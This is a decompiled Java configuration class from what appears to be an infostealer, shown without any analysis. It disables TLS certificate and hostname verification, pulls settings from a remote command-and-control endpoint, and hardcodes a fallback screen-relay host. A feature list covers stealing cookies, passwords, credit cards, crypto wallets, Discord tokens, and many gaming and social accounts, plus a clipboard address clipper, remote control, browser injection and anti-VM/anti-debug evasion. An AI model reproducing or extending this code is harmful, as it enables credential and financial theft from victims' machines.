/*
 * Decompiled with CFR 0.152.
 */
package aether;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.annotations.SerializedName;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import okhttp3.ConnectionSpec;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Config {
    public String buildId;
    public String relayUrl;
    public String streamRelayUrl;
    public Features features;

    public static Config load(String string, String string2) throws Exception {
        Object object = new X509TrustManager(){

            @Override
            public final X509Certificate[] getAcceptedIssuers() {
                return new X509Certificate[0];
            }

            @Override
            public final void checkClientTrusted(X509Certificate[] x509CertificateArray, String string) {
            }

            @Override
            public final void checkServerTrusted(X509Certificate[] x509CertificateArray, String string) {
            }
        };
        Object object2 = SSLContext.getInstance("TLS");
        ((SSLContext)object2).init(null, new TrustManager[]{object}, new SecureRandom());
        object = new OkHttpClient.Builder().sslSocketFactory(((SSLContext)object2).getSocketFactory(), (X509TrustManager)object).hostnameVerifier(new HostnameVerifier(){

            @Override
            public final boolean verify(String string, SSLSession sSLSession) {
                return true;
            }
        }).connectionSpecs(Arrays.asList(ConnectionSpec.MODERN_TLS, ConnectionSpec.COMPATIBLE_TLS, ConnectionSpec.CLEARTEXT)).connectTimeout(10L, TimeUnit.SECONDS).readTimeout(15L, TimeUnit.SECONDS).callTimeout(25L, TimeUnit.SECONDS).retryOnConnectionFailure(true).build();
        object2 = new Request.Builder().url(string + "/api/config/" + string2).build();
        Object object3 = null;
        int n2 = 0;
        while (n2 < 3) {
            if (n2 > 0) {
                try {
                    Thread.sleep(2000L * (long)n2);
                }
                catch (InterruptedException interruptedException) {}
            }
            object3 = ((OkHttpClient)object).newCall((Request)object2).execute();
            try {
                if (!((Response)object3).isSuccessful() || ((Response)object3).body() == null) {
                    throw new Exception("config fetch failed: " + ((Response)object3).code());
                }
                Object object4 = ((Response)object3).body().string();
                JsonObject jsonObject = JsonParser.parseString((String)object4).getAsJsonObject();
                object4 = new Config();
                new Config().buildId = string2;
                ((Config)object4).relayUrl = string + "/api/relay/" + string2;
                ((Config)object4).streamRelayUrl = jsonObject.has("streamRelayUrl") && !jsonObject.get("streamRelayUrl").isJsonNull() ? jsonObject.get("streamRelayUrl").getAsString() : "wss://screen-relay.abelbiffle.workers.dev";
                ((Config)object4).features = jsonObject.has("features") && !jsonObject.get("features").isJsonNull() ? new Gson().fromJson(jsonObject.get("features"), Features.class) : new Features();
                if (object3 != null) {
                    ((Response)object3).close();
                }
                return object4;
            }
            catch (Throwable throwable) {
                try {
                    if (object3 != null) {
                        try {
                            ((Response)object3).close();
                        }
                        catch (Throwable throwable2) {
                            throwable.addSuppressed(throwable2);
                        }
                    }
                    throw throwable;
                }
                catch (Exception exception) {
                    object3 = exception;
                    object3 = exception;
                    ++n2;
                }
            }
        }
        throw object3;
    }

    public static class Features {
        public boolean cookies;
        public boolean passwords;
        public boolean autofills;
        public boolean creditCards;
        public boolean wallets;
        public boolean discordTokens;
        public boolean screenshot;
        public boolean systemInfo;
        public boolean startup;
        public boolean history;
        public boolean bookmarks;
        public boolean antiVM;
        public boolean antiDebug;
        public boolean stolenFiles;
        public boolean steamAccounts;
        public boolean steam;
        public boolean epicGames;
        public boolean roblox;
        public boolean minecraft;
        public boolean instagram;
        public boolean tiktok;
        public boolean spotify;
        public boolean reddit;
        public boolean telegram;
        public boolean whatsApp;
        public boolean fileZilla;
        public boolean clipboard;
        public boolean riot;
        public boolean growtopia;
        public boolean battleNet;
        public boolean ubisoft;
        public boolean ea;
        public boolean rockstar;
        public boolean vpnData;
        public boolean clipper;
        @SerializedName(value="_clipperAddresses")
        public Map<String, String> clipperAddresses;
        public boolean remoteControl;
        public boolean browserInjection;
        public String launchMode;
        public String gameUrl;
    }
}

